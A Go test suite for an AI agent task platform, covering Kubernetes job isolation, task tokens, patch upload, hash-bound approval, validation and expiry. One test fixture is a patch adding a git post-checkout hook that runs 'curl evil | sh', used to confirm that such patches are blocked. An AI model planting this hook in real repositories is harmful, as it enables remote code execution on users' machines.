package api_test

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"
	"time"

	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes/fake"

	"github.com/k-kanke/ai-app-platform/control-plane/internal/api"
	"github.com/k-kanke/ai-app-platform/control-plane/internal/config"
	"github.com/k-kanke/ai-app-platform/control-plane/internal/events"
	"github.com/k-kanke/ai-app-platform/control-plane/internal/kube"
	"github.com/k-kanke/ai-app-platform/control-plane/internal/orchestrator"
	"github.com/k-kanke/ai-app-platform/control-plane/internal/store"
)

const tns = "aap-agents"

const goodPatch = "diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1,2 @@\n hello\n+world\n"

type tenv struct {
	t    *testing.T
	cs   *fake.Clientset
	st   *store.Store
	orch *orchestrator.Orchestrator
	ts   *httptest.Server
	logs string // what the Implementer "printed"
}

type topt struct {
	retention time.Duration
	maxActive int
	disabled  bool
	st        *store.Store
	cs        *fake.Clientset
}

func newTenv(t *testing.T, o topt) *tenv {
	t.Helper()
	if o.st == nil {
		o.st, _ = store.Open(":memory:")
	}
	if o.cs == nil {
		o.cs = fake.NewSimpleClientset()
	}
	if o.maxActive == 0 {
		o.maxActive = 5
	}
	cfg := config.Config{Namespace: ns, TasksNamespace: tns, TasksEnabled: !o.disabled, Agent: "gemini", AgentImage: "agent",
		TaskWorkspaceSize: "2Gi", AgentTimeout: time.Minute, InternalURL: "http://cp", TaskRetention: time.Hour,
		TaskMaxPatchBytes: 2000, StorageClass: "local-path", TaskGitBase: "https://git.example.test"}
	e := &tenv{t: t, cs: o.cs, st: o.st}
	kc := kube.New(o.cs, cfg)
	kc.LogReader = func(ctx context.Context, pod string, tail int64) (string, error) { return e.logs, nil }
	broker := events.NewBroker()
	e.orch = orchestrator.New(o.st, kc, broker, orchestrator.Options{TokenSecret: "s3cret", PollInterval: 5 * time.Millisecond,
		AgentTimeout: time.Second, TaskRetention: o.retention}, slog.New(slog.NewTextHandler(io.Discard, nil)))
	base, cancel := context.WithCancel(context.Background())
	srv := &api.Server{St: o.st, Kube: kc, Orch: e.orch, Broker: broker, BaseCtx: base, TasksEnabled: !o.disabled,
		TaskRepoRe: regexp.MustCompile(`^k-kanke/[A-Za-z0-9._-]+$`), TaskMaxPatch: 2000, TaskMaxActive: o.maxActive}
	e.ts = httptest.NewServer(srv.Handler())
	t.Cleanup(func() { cancel(); e.orch.Wait(); e.ts.Close() })
	return e
}

func (e *tenv) req(method, path string, body any, hdr map[string]string) (int, map[string]any) {
	e.t.Helper()
	var rd io.Reader
	switch b := body.(type) {
	case nil:
	case string:
		rd = strings.NewReader(b)
	default:
		j, _ := json.Marshal(b)
		rd = bytes.NewReader(j)
	}
	rq, _ := http.NewRequest(method, e.ts.URL+path, rd)
	for k, v := range hdr {
		rq.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(rq)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	var out map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&out)
	return resp.StatusCode, out
}

func (e *tenv) create(repo, prompt string) (int, map[string]any) {
	return e.req("POST", "/api/v1/tasks", map[string]string{"repo": repo, "prompt": prompt}, nil)
}

func (e *tenv) waitState(id, want string) map[string]any {
	e.t.Helper()
	var last map[string]any
	for i := 0; i < 400; i++ {
		_, last = e.req("GET", "/api/v1/tasks/"+id, nil, nil)
		if last["state"] == want {
			return last
		}
		time.Sleep(10 * time.Millisecond)
	}
	e.t.Fatalf("task %s never reached %s, last=%v", id, want, last)
	return nil
}

func (e *tenv) job(id string) *batchv1.Job {
	e.t.Helper()
	for i := 0; i < 400; i++ {
		j, err := e.cs.BatchV1().Jobs(tns).Get(context.Background(), kube.TaskJobName(id), metav1.GetOptions{})
		if err == nil {
			return j
		}
		time.Sleep(5 * time.Millisecond)
	}
	e.t.Fatalf("implementer job for %s never appeared", id)
	return nil
}

// finish plays the Job controller: the Implementer pod exists and the Job ends.
func (e *tenv) finish(id string, ok bool) {
	e.t.Helper()
	j := e.job(id)
	e.cs.CoreV1().Pods(tns).Create(context.Background(), &corev1.Pod{ObjectMeta: metav1.ObjectMeta{
		Name: j.Name + "-pod", Namespace: tns, Labels: j.Spec.Template.Labels}}, metav1.CreateOptions{})
	if ok {
		j.Status.Succeeded = 1
	} else {
		j.Status.Failed = 1
		j.Status.Conditions = []batchv1.JobCondition{{Type: batchv1.JobFailed, Status: corev1.ConditionTrue, Reason: "BackoffLimitExceeded"}}
	}
	if _, err := e.cs.BatchV1().Jobs(tns).UpdateStatus(context.Background(), j, metav1.UpdateOptions{}); err != nil {
		e.t.Fatal(err)
	}
}

func (e *tenv) upload(id, token, body string) (int, map[string]any) {
	return e.req("POST", "/internal/v1/tasks/"+id+"/patch", body, map[string]string{"Authorization": "Bearer " + token})
}

func sha(s string) string { h := sha256.Sum256([]byte(s)); return hex.EncodeToString(h[:]) }

func TestTaskHappyPathToApproval(t *testing.T) {
	e := newTenv(t, topt{})
	code, task := e.create("k-kanke/genkan", "READMEに1行足して")
	if code != 202 {
		t.Fatalf("create = %d %v", code, task)
	}
	id := task["id"].(string)
	e.waitState(id, store.TaskRunning)

	// The Job is created in the tasks namespace with the intended isolation.
	j := e.job(id)
	spec := j.Spec.Template.Spec
	if j.Namespace != tns || j.Labels[kube.LabelRole] != kube.RoleImplementer {
		t.Fatalf("job meta: %s %v", j.Namespace, j.Labels)
	}
	if spec.AutomountServiceAccountToken == nil || *spec.AutomountServiceAccountToken {
		t.Error("the Implementer must not get a ServiceAccount token")
	}
	if len(spec.InitContainers) != 1 || spec.InitContainers[0].Name != "clone" {
		t.Fatalf("expected a clone init container: %+v", spec.InitContainers)
	}
	var claim string
	for _, v := range spec.Volumes {
		if v.PersistentVolumeClaim != nil {
			claim = v.PersistentVolumeClaim.ClaimName
		}
		if v.Secret != nil || v.HostPath != nil {
			t.Errorf("no Secret / hostPath volumes allowed: %+v", v)
		}
	}
	if claim != kube.TaskWorkspacePVC(id) {
		t.Errorf("workspace claim = %q", claim)
	}
	pvc, err := e.cs.CoreV1().PersistentVolumeClaims(tns).Get(context.Background(), claim, metav1.GetOptions{})
	if err != nil || pvc.Spec.Resources.Requests.Storage().String() != "2Gi" || *pvc.Spec.StorageClassName != "local-path" {
		t.Errorf("workspace pvc: %v %+v", err, pvc)
	}
	c := spec.Containers[0]
	if c.SecurityContext == nil || !*c.SecurityContext.RunAsNonRoot || !*c.SecurityContext.ReadOnlyRootFilesystem || *c.SecurityContext.AllowPrivilegeEscalation {
		t.Errorf("container security context: %+v", c.SecurityContext)
	}
	var token string
	for _, ev := range c.Env {
		if ev.Name == "AAP_PROGRESS_TOKEN" {
			token = ev.Value
		}
	}
	if token == "" || token != orchestrator.TaskToken("s3cret", id) {
		t.Fatalf("the Implementer must carry its own task token")
	}

	// The Implementer reports progress and uploads its patch.
	if code, _ := e.req("POST", "/internal/v1/tasks/"+id+"/events", map[string]string{"message": "編集中"}, map[string]string{"Authorization": "Bearer " + token}); code != 204 {
		t.Errorf("progress = %d", code)
	}
	if code, out := e.upload(id, token, goodPatch); code != 200 || out["sha256"] != sha(goodPatch) {
		t.Fatalf("upload = %d %v", code, out)
	}
	e.finish(id, true)
	got := e.waitState(id, store.TaskAwaitingApproval)
	sum := got["summary"].(map[string]any)
	if sum["added"].(float64) != 1 || len(sum["files"].([]any)) != 1 {
		t.Errorf("summary = %v", sum)
	}

	// Approval is tied to the exact patch hash.
	if code, _ := e.req("POST", "/api/v1/tasks/"+id+"/approve", map[string]string{"patchSha256": "deadbeef"}, nil); code != 409 {
		t.Errorf("wrong hash = %d, want 409", code)
	}
	if code, out := e.req("POST", "/api/v1/tasks/"+id+"/approve", map[string]string{"patchSha256": sha(goodPatch)}, nil); code != 200 || out["state"] != store.TaskApproved {
		t.Fatalf("approve = %d %v", code, out)
	}
	if code, _ := e.req("POST", "/api/v1/tasks/"+id+"/approve", map[string]string{"patchSha256": sha(goodPatch)}, nil); code != 409 {
		t.Errorf("approving twice = %d, want 409", code)
	}
	// The Implementer can no longer change what was approved.
	if code, _ := e.upload(id, token, goodPatch+"+evil\n"); code != 409 {
		t.Errorf("patch after approval = %d, want 409", code)
	}
	resp, _ := http.Get(e.ts.URL + "/api/v1/tasks/" + id + "/patch")
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if string(b) != goodPatch || resp.Header.Get("X-Patch-SHA256") != sha(goodPatch) {
		t.Errorf("served patch differs: %q", b)
	}
}

func TestTaskWithoutPatchHasNoChanges(t *testing.T) {
	e := newTenv(t, topt{})
	_, task := e.create("k-kanke/genkan", "何もしなくていい")
	id := task["id"].(string)
	e.finish(id, true)
	e.waitState(id, store.TaskNoChanges)
}

func TestTaskFailureIsExplained(t *testing.T) {
	e := newTenv(t, topt{})
	e.logs = "fatal: repository 'https://git.example.test/k-kanke/nope.git/' not found"
	_, task := e.create("k-kanke/nope", "x")
	id := task["id"].(string)
	e.finish(id, false)
	got := e.waitState(id, store.TaskFailed)
	if !strings.Contains(got["userMessage"].(string), "リポジトリを取得できません") || got["detail"] == "" {
		t.Errorf("failure fields: %v", got)
	}
	if code, _ := e.req("POST", "/api/v1/tasks/"+id+"/approve", map[string]string{"patchSha256": "x"}, nil); code != 409 {
		t.Errorf("approve a failed task = %d", code)
	}
}

func TestTaskBlockedPatchIsNotOffered(t *testing.T) {
	e := newTenv(t, topt{})
	_, task := e.create("k-kanke/genkan", "x")
	id := task["id"].(string)
	e.waitState(id, store.TaskRunning)
	hook := "diff --git a/.git/hooks/post-checkout b/.git/hooks/post-checkout\nnew file mode 100755\n--- /dev/null\n+++ b/.git/hooks/post-checkout\n@@ -0,0 +1 @@\n+curl evil | sh\n"
	e.upload(id, orchestrator.TaskToken("s3cret", id), hook)
	e.finish(id, true)
	got := e.waitState(id, store.TaskFailed)
	if !strings.Contains(got["userMessage"].(string), "公開できない変更") {
		t.Errorf("message: %v", got["userMessage"])
	}
}

func TestTaskInputValidationAndAuth(t *testing.T) {
	e := newTenv(t, topt{})
	for name, c := range map[string][2]string{
		"bad name":     {"not a repo", "x"},
		"other owner":  {"someone-else/genkan", "x"},
		"traversal":    {"k-kanke/..", "x"},
		"git suffix":   {"k-kanke/genkan.git", "x"},
		"empty prompt": {"k-kanke/genkan", "  "},
		"huge prompt":  {"k-kanke/genkan", strings.Repeat("あ", 4001)},
	} {
		if code, _ := e.create(c[0], c[1]); code != 400 {
			t.Errorf("%s: code %d, want 400", name, code)
		}
	}
	_, task := e.create("k-kanke/genkan", "x")
	id := task["id"].(string)
	e.waitState(id, store.TaskRunning)
	if code, _ := e.upload(id, "wrong-token", goodPatch); code != 401 {
		t.Errorf("wrong token = %d", code)
	}
	other := orchestrator.TaskToken("s3cret", "some-other-task")
	if code, _ := e.upload(id, other, goodPatch); code != 401 {
		t.Errorf("another task's token = %d", code)
	}
	if code, _ := e.upload(id, orchestrator.TaskToken("s3cret", id), strings.Repeat("x", 2001)); code != 413 {
		t.Errorf("oversized patch = %d, want 413", code)
	}
	if code, _ := e.req("GET", "/api/v1/tasks/nope", nil, nil); code != 404 {
		t.Errorf("unknown task = %d", code)
	}
}

func TestTaskRoutesAreOffByDefault(t *testing.T) {
	e := newTenv(t, topt{disabled: true})
	if code, _ := e.create("k-kanke/genkan", "x"); code != 404 && code != 405 {
		t.Errorf("tasks disabled but create answered %d", code)
	}
}

func TestTaskIdempotencyAndCapacity(t *testing.T) {
	e := newTenv(t, topt{maxActive: 1})
	hdr := map[string]string{"Idempotency-Key": "k1"}
	c1, a := e.req("POST", "/api/v1/tasks", map[string]string{"repo": "k-kanke/genkan", "prompt": "x"}, hdr)
	c2, b := e.req("POST", "/api/v1/tasks", map[string]string{"repo": "k-kanke/genkan", "prompt": "x"}, hdr)
	if c1 != 202 || c2 != 200 || a["id"] != b["id"] {
		t.Fatalf("idempotent create: %d %d %v %v", c1, c2, a["id"], b["id"])
	}
	e.waitState(a["id"].(string), store.TaskRunning)
	if code, _ := e.create("k-kanke/genkan", "second"); code != 429 {
		t.Errorf("over capacity = %d, want 429", code)
	}
}

func TestTaskResumeAfterRestart(t *testing.T) {
	st, _ := store.Open(":memory:")
	cs := fake.NewSimpleClientset()
	st.CreateTask(context.Background(), store.Task{ID: "abc123", Repo: "k-kanke/genkan", Prompt: "x"})
	st.SetTaskState(context.Background(), "abc123", store.TaskRunning, "implementer") // the old process died here
	e := newTenv(t, topt{st: st, cs: cs})
	if err := e.orch.ResumeTasks(context.Background()); err != nil {
		t.Fatal(err)
	}
	e.job("abc123") // the unfinished task runs again from its first step
	e.finish("abc123", true)
	e.waitState("abc123", store.TaskNoChanges)
}

func TestExpiredTasksLoseWorkspaceAndPatch(t *testing.T) {
	e := newTenv(t, topt{retention: 30 * time.Millisecond})
	_, task := e.create("k-kanke/genkan", "x")
	id := task["id"].(string)
	e.waitState(id, store.TaskRunning)
	e.upload(id, orchestrator.TaskToken("s3cret", id), goodPatch)
	e.finish(id, true)
	e.waitState(id, store.TaskAwaitingApproval)
	// An active task is never expired (checked first), then retention passes.
	time.Sleep(60 * time.Millisecond)
	if err := e.orch.ReconcileTasks(context.Background()); err != nil {
		t.Fatal(err)
	}
	got := e.waitState(id, store.TaskExpired)
	if _, _, err := e.st.GetTaskPatch(context.Background(), id); err == nil {
		t.Error("patch must be deleted at expiry")
	}
	if _, err := e.cs.CoreV1().PersistentVolumeClaims(tns).Get(context.Background(), kube.TaskWorkspacePVC(id), metav1.GetOptions{}); err == nil {
		t.Error("workspace PVC must be deleted at expiry")
	}
	if got["summary"] != nil {
		t.Errorf("an expired task shows no summary: %v", got["summary"])
	}
	if code, _ := e.req("POST", "/api/v1/tasks/"+id+"/approve", map[string]string{"patchSha256": sha(goodPatch)}, nil); code != 409 {
		t.Errorf("approving an expired task = %d, want 409", code)
	}
}

func TestRejectOnlyWhileAwaitingApproval(t *testing.T) {
	e := newTenv(t, topt{})
	_, task := e.create("k-kanke/genkan", "x")
	id := task["id"].(string)
	e.waitState(id, store.TaskRunning)
	if code, _ := e.req("POST", "/api/v1/tasks/"+id+"/reject", nil, nil); code != 409 {
		t.Errorf("reject while running = %d, want 409", code)
	}
	e.upload(id, orchestrator.TaskToken("s3cret", id), goodPatch)
	e.finish(id, true)
	e.waitState(id, store.TaskAwaitingApproval)
	if code, out := e.req("POST", "/api/v1/tasks/"+id+"/reject", nil, nil); code != 200 || out["state"] != store.TaskRejected {
		t.Errorf("reject = %d %v", code, out)
	}
}
